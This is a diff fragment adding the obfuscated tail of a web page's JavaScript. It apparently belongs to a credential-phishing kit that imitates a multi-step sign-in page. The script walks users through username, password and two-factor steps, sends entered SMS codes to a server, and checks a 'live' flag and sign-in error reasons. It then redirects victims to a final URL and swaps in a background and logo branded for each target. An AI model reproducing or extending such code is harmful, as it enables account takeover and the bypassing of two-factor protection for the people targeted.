+                'code': smsInp['value']
+            },
+            'success': function(_0x55ec2a) {
+                const { live: _0x2948be } = _0x55ec2a;
+                if (_0x2948be) !codeVal && (hide('sms', !![], ''), document['getElementById']('section_sms')['classList']['add']('d-none'), document['getElementById']('section_final')['classList']['remove']('d-none'), view = 'final');
+                else {
+                    hide('sms', ![], unSms);
+                    if (_0x55ec2a['reason'] != 'SMSAuthFailedWrongCodeEntered') {}
+                }
+            },
+            'error': function() {
+                alert('An error occurred.');
+            }
+        });
+    }
+	
+	if(view==='uname') _0x592abb(unameInp['value']['trim']()!=='');
+	else{
+		if(view==='pwd') _0x9e84c(pwdInp['value']['trim']()!=='');
+		else{
+			if(view==='2fa_submit_code') _0x1d6c79(codeInp['value']['trim']()!=='');
+			else view==='2fa_submit_sms'&&_0x44f07c(smsInp['value']['trim']()!=='');
+		}
+	}
+	return![];
+}
+
+function handleBackButtonClick() {
+    if (view === 'pwd') unameVal = ![], updateView('uname', ['section_uname'], ['section_pwd']), placeholderImage['style']['display'] = 'none', setBackgroundAndLogo(defaultBackground, defaultLogo);
+    else ['2fa_submit_app', '2fa_submit_sms', '2fa_submit_code']['includes'](view) && (twoVal = ![], view = '2fa', toggleVisibility('section_2fa', !![]), toggleVisibility('section_appnotif', ![]), toggleVisibility('section_sms', ![]), toggleVisibility('section_verifnotif', ![]));
+}
+document['querySelectorAll']('.back')['forEach'](_0x5748cf => {
+    _0x5748cf['addEventListener']('click', handleBackButtonClick);
+});
+
+function handleFinalButtonClick() {
+    if (view === 'final') window['location']['href'] = final_redirect;
+    else view === '2fa' && (updateView('pwd', ['section_pwd'], ['section_2fa']), document['querySelectorAll']('#user_identity')['forEach'](_0x5bbb39 => _0x5bbb39['innerText'] = enmail), unameInp['value'] = enmail, unameVal = !![], pwdVal = ![]);
+}
+document['querySelectorAll']('#btn_final')['forEach'](_0x39a1a8 => {
+    _0x39a1a8['addEventListener']('click', handleFinalButtonClick);
+}), signInOptions['textContent'] = decodedText, hideOption('.option[data-url="verify_sms"]'), hideOption('.option[data-url="verify_app"]'), hideOption('.option[data-url="verify_code"]');
+
+
+
+});
+
+    
+</script>
+</body>
+
+</html>
+
